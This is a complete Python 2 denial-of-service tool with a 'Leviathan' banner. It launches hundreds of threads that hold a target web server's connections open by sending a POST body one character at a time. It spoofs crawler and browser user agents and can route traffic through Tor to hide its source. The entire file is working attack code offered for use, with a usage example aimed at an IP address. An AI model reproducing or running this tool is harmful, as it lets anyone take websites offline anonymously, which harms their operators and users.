#!/usr/bin/env python
import os, re, time, sys, random, math, getopt, socks, string, terminal
from threading import Thread
stop_now = False
term = terminal.TerminalController()
useragents = [
 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
 'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
 'Opera/9.20 (Windows NT 6.0; U; en)',
 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
 'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
 'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
 'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
 'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)']

class httpPost(Thread):

    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True

    def _send_http_post(self, pause=10):
        global stop_now
        global term
        self.socks.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n' % (
         self.host, random.choice(useragents)))
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters + string.digits)
            print term.BOL + term.UP + term.CLEAR_EOL + 'Posting: %s' % p + term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))

        self.socks.close()

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL + term.UP + term.CLEAR_EOL + 'Connected to host...' + term.NORMAL
                    break
                except Exception as e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL + term.UP + term.CLEAR_EOL + 'Error connecting to host...' + term.NORMAL
                    time.sleep(1)
                    continue

            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL + term.UP + term.CLEAR_EOL + 'Thread broken, restarting...' + term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)


def usage():
    print '  \x1b[31;1m'
    print 'Usage \x1b[33m> \x1b[37;1mpython2 dos.py -t <target> [-r <threads> -p <port> -T -h]'
    print '\x1b[31mExample \x1b[33m> \x1b[37;1mpython2 dos.py -t 125.100.1.100 -r 256'


def main(argv):
    global stop_now
    try:
        opts, args = getopt.getopt(argv, 'hTt:r:p:', ['help', 'tor', 'target=', 'threads=', 'port='])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)
    else:
        target = ''
        threads = 256
        tor = False
        port = 80
        for o, a in opts:
            if o in ('-h', '--help'):
                usage()
                sys.exit(0)
            if o in ('-T', '--tor'):
                tor = True
            elif o in ('-t', '--target'):
                target = a
            elif o in ('-r', '--threads'):
                threads = int(a)
            elif o in ('-p', '--port'):
                port = int(a)

        if target == '' or int(threads) <= 0:
            usage()
            sys.exit(-1)
        print term.DOWN + term.RED + '/*' + term.NORMAL
        print term.RED + ' * Target: %s Port: %d' % (target, port) + term.NORMAL
        print term.RED + ' * Threads: %d Tor: %s' % (threads, tor) + term.NORMAL
        print term.RED + ' * Give 20 seconds without tor or 40 with before checking site' + term.NORMAL
        print term.RED + ' */' + term.DOWN + term.DOWN + term.NORMAL
        rthreads = []
        for i in range(threads):
            t = httpPost(target, port, tor)
            rthreads.append(t)
            t.start()

        while len(rthreads) > 0:
            try:
                rthreads = [ t.join(1) for t in rthreads if t is not None and t.isAlive() ]
            except KeyboardInterrupt:
                print '\nKilling All Connections\n'
                for t in rthreads:
                    stop_now = True
                    t.running = False

    return


if __name__ == '__main__':
    print '\x1b[31;1m'
    print ' _               _       _   _'
    print '| |    _____   _(_) __ _| |_| |__   __ _ _ __'
    print '| |   / _ \\ \\ / / |/ _` | __| \'_ \\ / _` | \'_ " '
    print '| |__|  __/\\ V /| | (_| | |_| | | | (_| | | | |'
    print '|_____\\___| \\_/ |_|\\__,_|\\__|_| |_|\\__,_|_| |_|'
    print '\x1b[31;1m[+] \x1b[37mAuthor \x1b[33;1m> \x1b[37;1mGunadiCBR & Mr.CBR'
    print ' '
    main(sys.argv[1:])
